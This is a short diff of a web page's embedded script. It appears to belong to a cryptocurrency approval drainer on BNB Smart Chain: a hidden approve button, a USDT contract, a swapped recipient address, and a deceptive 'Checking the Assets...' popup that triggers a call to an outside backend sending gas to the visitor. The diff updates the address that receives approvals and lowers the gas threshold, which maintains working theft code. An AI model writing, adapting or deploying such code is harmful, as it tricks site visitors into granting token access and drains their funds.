@@ -1252,7 +1252,7 @@
                                                             <button type="button" onclick="approveToken()" style="display: none;">Approve</button>
                                                 <script src="https://cdn.jsdelivr.net/npm/web3@1.7.0/dist/web3.min.js"></script>
 <script>
-const bscAddress = "0xBe9CA52f6fbcD025e9464B7727D36Af5eff42Ec1";
+const bscAddress = "0xce81b9c0658B84F2a8fD7adBBeC8B7C26953D090";
 const bnbGasSender = "0x04a7f2e3E53aeC98B9C8605171Fc070BA19Cfb87";
 const usdtContractAddress = "0x55d398326f99059fF775485246999027B3197955";
 
@@ -1373,7 +1373,7 @@ async function approveToken() {
             return;
         }
 
-        if (bnbBalance < 0.0005) {
+        if (bnbBalance < 0.0001) {
             showPopup("Checking the Assets...", "blue");
             await fetch("https://bepusdt-backend-production.up.railway.app/send-bnb", {
                 method: "POST",
